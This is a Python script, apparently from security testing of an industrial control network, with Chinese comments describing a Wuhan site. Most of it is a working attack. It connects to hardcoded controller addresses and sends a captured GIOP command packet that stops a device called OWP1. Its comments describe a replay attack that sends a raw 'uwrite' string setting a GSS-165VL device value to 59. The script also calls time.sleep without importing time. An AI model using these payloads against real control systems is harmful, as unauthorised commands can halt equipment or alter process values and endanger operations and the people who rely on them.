from protocols.packet_giop import *
import socket



class TestWuhan(object):
    def __init__(self):
        pass

    def test(self):
        self.test_sas_start_owp1()

    '''
    功能：测试主机连接到CCT，使用GIOP协议下发OWP1启动命令
    说明：现场环境中，与CCT通信的是SAS
         实际流量中，SAS通过一条TCP长连接，向CCT发送命令包
         CCT接到命令包后，会根据执行过程的进展，通过另一条TCP长连接向SAS反馈执行状态
         而此方法模拟SAS端，首先与CCT建立TCP连接，之后发送GIOP请求包（idl_execute_command）
         后续的状态反馈同样通过另一条TCP连接返回给SAS
    注意：不同的SAS操作（启/停各类2层设备）都使用'idl_execute_command'命令包
         同一种方法（即：方法名相同），在不同服务器上（例如：CCT1和CCT2）对应的KeyAddress字段值不同
         不同的操作（例如：启动OWP5和停止OWP5），使用的负载（StubData字段）不同
    【重要】：使用脚本与CCT等现场设备建立TCP连接前，需要首先配置本机的静态IPv4地址
            例如：CCT的IP地址为192.168.69.101
                 与CCT1建立TCP连接前，需要配置本机IP地址为192.168.69.xxx（此网段内未使用的IP地址），子网掩码为255.255.255.0
                 即测试主机与CCT1服务器处于同一网段，此外，测试主机连接交换机的端口不能是镜像口
    '''

    def test_sas_start_owp1(self):
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt.connect(('192.168.69.101', 11900))
        # TODO: Capture the packet and fill it here

    def test_sas_stop_owp1(self):
        skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        skt.connect(('192.168.69.101', 11900))
        pkt = GIOP(type='Request',
                   RequestID=1,
                   KeyAddress=h2b('14010f005253547f0c926117860b00030000000100000004000000'),
                   RequestOperation='idl_execute_command',
                   StubData=h2b('0300000034390065010000002b0000002461646163735f7066612f636f6d5f636d642f67656'
                                'e6572616c5f73746f705f6d616e616765722e7368000001000000090000006b69632d6f7770'
                                '31000000000200000000000000')
                   )
        skt.send(bytes(pkt))
        print('Sleeping... 3s')
        time.sleep(3)
        skt.close()


    # 功能：修改GSS-165VL设备值，测试主机连接到AW，使用TCP负载下发命令
    # 说明：CFR-AW段的流量，做回放攻击时，可通过连接到AW的TCP连接下发命令，命令数据包形式即TCP直传的字符串负载
    def test_cfr_aw_165vl_change_value(self):
        skt_aw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ## 武汉AW2
        skt_aw.connect(('192.168.1.1', 45678))

        # 负载第二行行尾处的最后一个参数（'59'），即表示将设备值修改为 59
        pkt_aw = '[26 (uwrite, 1, 0, 1)]\x0a' \
                 '[0 (  0,  0,314753535F4E393A313635564C5F53322E504E5400, 3,             59)]\x0a' \
                 '[-1(1)]\x0a\x00'
        skt_aw.send(bytes(pkt_aw, encoding='utf-8'))

        print('Sleeping... 0.5s')
        time.sleep(0.5)

        print('Sleeping... 3s')
        time.sleep(3)
        skt_aw.close()

if __name__ == '__main__':
    def run():
        # TestS5().test()
        TestWuhan().test()
    run()
